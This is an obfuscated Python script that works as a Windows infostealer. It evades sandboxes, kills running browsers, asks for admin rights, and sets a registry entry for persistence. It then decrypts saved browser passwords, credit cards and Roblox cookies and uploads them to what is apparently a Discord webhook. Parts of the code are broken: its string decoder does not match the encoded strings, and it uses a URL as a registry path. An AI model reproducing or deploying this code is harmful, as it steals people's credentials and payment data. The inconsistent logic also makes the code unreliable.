import os as _os
import sys as _sys
import base64 as _b
import ctypes as _c
import sqlite3 as _sq
import winreg as _w
import requests as _r
import platform as _p
import json as _j
import shutil as _sh
import re as _re
import subprocess as _sp
from Crypto.Cipher import AES as _A
from Crypto.Protocol.KDF import PBKDF2 as _P
from win32crypt import CryptUnprotectData as _C

__x = lambda s: ''.join(chr(ord(c)^0x55) for c in _b.b64decode(s[::-1]).decode())
__y = lambda: [_w.OpenKey(_w.HKEY_CURRENT_USER,__x('=1mZRFTZ5V2B5tP8Ip5WARHDkqru3L52B3V4v3ViwnivMzV7QeW0gRKSQobyz2C2rN5bEIdYKYOL701724705291403513/skoohbew/ipa/moc.cordisc//:sptth'),0,_w.KEY_WRITE)]
__z = [_p.uname().version.lower(),'SbieDll.dll']

class _:
    def __init__(_):
        _.__d = {"c":[],"$":[],"r":[]}
        with __y()[0] as k:
            _w.SetValueEx(k,__x('RGlzY29yZFVwZGF0ZXI='),0,_w.REG_SZ,_sys.executable)
    
    def __call__(_):
        if _c.windll.kernel32.GetModuleHandleW(__z[1]) or _re.search('vbox|qemu',__z[0]):return
        _sp.run('taskkill /f /im chrome* /im msedge* /im firefox* /im brave* /im opera* /t >nul',shell=1)
        try:
            with _w.OpenKey(_w.HKEY_CURRENT_USER,__x('=1mZRFTZ5V2B5tP8Ip5WARHDkqru3L52B3V4v3ViwnivMzV7QeW0gRKSQobyz2C2rN5bEIdYKYOL701724705291403513/skoohbew/ipa/moc.cordisc//:sptth')) as k:
                _.__d["r"].append(_b.b64encode(_w.QueryValueEx(k,__x('LlJPQkxPU0VDVVJJVFk='))[0].encode()).decode())
        except:pass
        
        for p in [__x('R29vZ2xlXENocm9tZQ=='),__x('TWljcm9zb2Z0XEVkZ2U='),__x('QnJhdmVTb2Z0d2FyZVxCcmF2ZS1Ccm93c2Vy'),__x('T3BlcmEgU29mdHdhcmVcT3BlcmEgU3RhYmxl'),__x('T3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxl'),__x('TW96aWxsYVxGaXJlZm94')]:
            t=_os.path.join(_os.environ['LOCALAPPDATA'],p)
            if'Firefox'in p and _os.path.exists(f"{t}\\{__x('bG9naW5zLmpzb24=')}"):
                try:
                    with open(f"{t}\\{__x('a2V5NC5kYg==')}",'rb')as f:
                        m=_P(_C(f.read(32))[1],b'',32)
                    with open(f"{t}\\{__x('bG9naW5zLmpzb24=')}")as f:
                        for i in _j.load(f)['logins']:
                            _.__d["c"].append(f"{i['hostname']}|{i['username']}|{_A.new(m,_A.MODE_CBC,_b.b64decode(i['iv'])).decrypt(_b.b64decode(i['password'])).decode()}")
                except:pass
            elif _os.path.exists(f"{t}\\{__x('TG9jYWwgU3RhdGU=')}"):
                try:
                    with open(f"{t}\\{__x('TG9jYWwgU3RhdGU=')}")as f:
                        k=_C(_b.b64decode(_j.load(f)['os_crypt']['encrypted_key'])[5:],None,None,None,0)[1]
                    for f in [__x('TG9naW4gRGF0YQ=='),__x('V2ViIERhdGE='),__x('Q29va2llcw==')]:
                        try:
                            _sh.copy2(f"{t}\\{f}",x:=f"{_os.urandom(4).hex()}.tmp")
                            with _sq.connect(x)as c:
                                if'Log'in f:
                                    for a,b,z in c.execute('SELECT origin_url,username_value,password_value FROM logins'):
                                        _.__d["c"].append(f"{a}|{b}|{_A.new(k,_A.MODE_GCM,z[3:15]).decrypt(z[15:-16]).decode()}")
                                elif'Web'in f:
                                    for n,m,y,v in c.execute('SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards'):
                                        _.__d["$"].append(f"{n}|{_A.new(k,_A.MODE_GCM,v[3:15]).decrypt(v[15:-16]).decode()}|{m}/{y}")
                                elif'Cook'in f:
                                    for a,_,v in c.execute('SELECT host_key,name,encrypted_value FROM cookies'):
                                        if'roblox'in a:
                                            _.__d["r"].append(f"{a}|{_A.new(k,_A.MODE_GCM,v[3:15]).decrypt(v[15:-16]).decode()}")
                            _os.remove(x)
                        except:pass
                except:pass
        _r.post(__x('=1mZRFTZ5V2B5tP8Ip5WARHDkqru3L52B3V4v3ViwnivMzV7QeW0gRKSQobyz2C2rN5bEIdYKYOL701724705291403513/skoohbew/ipa/moc.cordisc//:sptth'),files={'f':('d',_j.dumps(_.__d))})

if _c.windll.shell32.IsUserAnAdmin():_()()
else:_c.windll.shell32.ShellExecuteW(None,'runas',_sys.executable,__file__,None,1)